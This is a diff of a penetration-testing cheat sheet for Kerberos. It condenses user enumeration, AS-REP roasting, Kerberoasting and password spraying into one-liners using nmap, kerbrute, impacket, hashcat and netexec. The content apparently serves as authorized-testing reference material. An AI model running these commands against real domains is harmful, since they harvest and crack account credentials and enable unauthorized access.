@@ -15,66 +15,38 @@
 
 ## Enumeration
 
-### Nmap Scripts
+### Quick Check (One-liner)
 
 ```shell
-# Service detection
-nmap -p 88 -sV $rhost
-
-# Kerberos user enumeration
-nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm=$domain $rhost
+# Nmap Kerberos enum
+nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm=$domain,userdb=/usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt $rhost
 ```
 
-### User Enumeration
+### User Enumeration (One-liner)
 
 ```shell
-# Kerbrute
-kerbrute userenum -d $domain --dc $rhost users.txt
-
-# Nmap
-nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm=$domain,userdb=users.txt $rhost
+# Kerbrute (fastest)
+kerbrute userenum -d $domain --dc $rhost /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -t 100 | tee kerb_users.txt
 ```
 
 ---
 
-## Attacks
+## Attacks (One-liner)
 
-> **📚 For complete Kerberos attack methodology, theory, and advanced techniques, see [Kerberos Attacks](../../3.AD-Exploit/3.3.Kerberos-Attacks.md)**
+> **📚 For complete methodology, see [Kerberos Attacks](../../3.AD-Exploit/3.3.Kerberos-Attacks.md)**
 
-### AS-REP Roasting
-
-> Targets users with "Do not require Kerberos preauthentication" enabled
+### AS-REP Roasting (One-liner)
 
 ```shell
-# Impacket - Get AS-REP hash
-impacket-GetNPUsers $domain/ -dc-ip $rhost -usersfile users.txt -format hashcat -outputfile asrep.txt
-
-# With credentials
-impacket-GetNPUsers $domain/$user:$password -dc-ip $rhost -request
-
-# Rubeus (Windows)
-.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
-
-# Crack with hashcat
-hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
+# Get AS-REP hash + crack
+impacket-GetNPUsers $domain/ -dc-ip $rhost -usersfile users.txt -format hashcat -outputfile asrep.txt && hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
 ```
 
-### Kerberoasting
-
-> Targets Service Principal Names (SPNs)
+### Kerberoasting (One-liner)
 
 ```shell
-# Impacket - Get TGS ticket
-impacket-GetUserSPNs $domain/$user:$password -dc-ip $rhost -request
-
-# Save to file
-impacket-GetUserSPNs $domain/$user:$password -dc-ip $rhost -request -outputfile tgs.txt
-
-# Rubeus (Windows)
-.\Rubeus.exe kerberoast /outfile:tgs.txt
-
-# Crack with hashcat
-hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt
+# Get TGS + crack
+impacket-GetUserSPNs $domain/$user:$password -dc-ip $rhost -request -outputfile tgs.txt && hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt
 ```
 
 ### Password Spraying
@@ -84,7 +56,7 @@ hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt
 kerbrute passwordspray -d $domain --dc $rhost users.txt 'Password123!'
 
 # NetExec
-netexec smb $rhost -u users.txt -p 'Password123!' --continue-on-success
+nxc smb $rhost -u users.txt -p 'Password123!' --continue-on-success
 ```
 
 ---
